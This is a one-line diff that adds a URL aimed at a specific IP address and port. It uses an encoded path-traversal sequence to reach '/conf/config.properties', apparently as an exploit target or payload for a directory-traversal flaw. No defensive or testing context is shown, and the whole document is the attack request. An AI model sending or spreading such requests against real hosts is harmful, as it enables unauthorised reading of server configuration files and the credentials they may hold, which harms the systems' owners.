@@ -1,0 +1,1 @@
+http://119.28.245.104:8090/%2F..%2F/conf/config.properties
